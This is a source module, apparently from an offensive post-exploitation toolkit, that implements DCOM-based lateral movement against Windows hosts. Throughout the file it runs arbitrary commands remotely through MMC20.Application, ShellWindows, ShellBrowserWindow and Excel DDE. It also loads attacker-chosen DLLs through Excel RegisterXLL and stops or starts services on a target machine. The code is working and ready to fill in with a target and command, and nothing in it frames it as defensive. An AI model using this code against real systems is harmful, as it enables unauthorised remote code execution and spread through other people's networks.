/*
    This module is inspired from SharpSploit (https://github.com/cobbr/SharpSploit) and Invoke-DCOM (https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1)
*/
import System

public static def DCOMExec(host as string, command as string, parameters as string, directory as string, method as string, serviceName as string, dllPath as string) as string:
    ComType as Type
    RemoteComObject as object
    try:
        if method == "mmc20_application":
            ComType = Type.GetTypeFromProgID("MMC20.Application", host)
            RemoteComObject = Activator.CreateInstance(ComType)
            RemoteComObject.Document.ActiveView.ExecuteShellCommand(command, directory, parameters, "7")
            print "DCOM execution successful. Executed: \"" + directory + command + " " + parameters + "\" on: " + host
        elif method == "ShellWindows":
            ComType = Type.GetTypeFromCLSID(Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), host)
            RemoteComObject = Activator.CreateInstance(ComType)
            Item = RemoteComObject.Item()
            Item.Document.Application.ShellExecute("cmd.exe","/c " + command + " " + parameters,"c:\\windows\\system32",null,0)
            print "DCOM execution successful. Executed: \"c:\\windows\\system32\\cmd.exe /c " + command + " " + parameters + "\" on: " + host
        elif method == "ShellBrowserWindow":
            ComType = Type.GetTypeFromCLSID(Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), host)
            RemoteComObject = Activator.CreateInstance(ComType)
            RemoteComObject.Document.Application.ShellExecute("cmd.exe","/c " + command + " " + parameters,"c:\\windows\\system32",null,0)
            print "DCOM execution successful. Executed: \"c:\\windows\\system32\\cmd.exe /c " + command + " " + parameters + "\" on: " + host
        elif method == "CheckDomain":
            ComType = Type.GetTypeFromCLSID(Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), host)
            RemoteComObject = Activator.CreateInstance(ComType)
            if RemoteComObject.Document.Application.GetSystemInformation("IsOS_DomainMember"):
                print host + " is a domain member"
            else:
                print host + " is not a domain member"
        elif method == "ServiceCheck":
            if not serviceName:
                print "ServiceName options must be set for this DCOM method"
                return
            ComType = Type.GetTypeFromCLSID(Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), host)
            RemoteComObject = Activator.CreateInstance(ComType)
            if RemoteComObject.Document.Application.IsServiceRunning(serviceName):
                print "Service " + serviceName + " is running on " + host
            else:
                print "Service " + serviceName + " is not running on " + host
        elif method == "MinimizeAll":
            ComType = Type.GetTypeFromCLSID(Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), host)
            RemoteComObject = Activator.CreateInstance(ComType)
            RemoteComObject.Document.Application.MinimizeAll()
            print "Successfully minimized all Windows in " + host
        elif method == "ServiceStop":
            if not serviceName:
                print "ServiceName options must be set for this DCOM method"
                return
            ComType = Type.GetTypeFromCLSID(Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), host)
            RemoteComObject = Activator.CreateInstance(ComType)
            if RemoteComObject.Document.Application.ServiceStop(serviceName):
                print "Successfully stoped service " + serviceName + " on " + host
            else:
                print "Failed to stop service " + serviceName + " on " + host
        elif method == "ServiceStart":
            if not serviceName:
                print "ServiceName options must be set for this DCOM method"
                return
            ComType = Type.GetTypeFromCLSID(Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), host)
            RemoteComObject = Activator.CreateInstance(ComType)
            if RemoteComObject.Document.Application.ServiceStart(serviceName):
                print "Successfully started service " + serviceName + " on " + host
            else:
                print "Failed to start service " + serviceName + " on " + host
        elif method == "DetectOffice":
            ComType = Type.GetTypeFromProgID("Excel.Application", host)
            RemoteComObject = Activator.CreateInstance(ComType)
            isx64 as bool = RemoteComObject.Application.ProductCode[21]
            if isx64:
                print "Office x64 detected"
            else:
                print "Office x86 detected"
        elif method == "RegisterXLL":
            if not dllPath:
                print "DllPath options must be set for this DCOM method"
                return
            ComType = Type.GetTypeFromProgID("Excel.Application", host)
            RemoteComObject = Activator.CreateInstance(ComType)
            if RemoteComObject.Application.RegisterXLL(dllPath):
                print "Successfully registered dll " + dllPath + " on " + host
            else:
                print "Failed to register dll " + dllPath + " on " + host
        elif method == "ExcelDDE":
            ComType = Type.GetTypeFromProgID("Excel.Application", host)
            RemoteComObject = Activator.CreateInstance(ComType)
            RemoteComObject.DisplayAlerts = false
            if RemoteComObject.DDEInitiate("cmd", "/c " + command + " " + parameters):
                print "DCOM execution successful. Executed: \"c:\\windows\\system32\\cmd.exe /c " + command + " " + parameters + "\" on: " + host
            else:
                print "Failed to execute command using ExcelDDE DCOM method"
        else:
            print "Invalid DCOM method"
    except e:
        print "DCOM failed: " + e


public static def Main():
    DCOMExec("TARGET", "COMMAND", parameters="PARAMETERS", directory="DIRECTORY", method="METHOD", serviceName="SERVICE_NAME", dllPath="DLL_PATH")
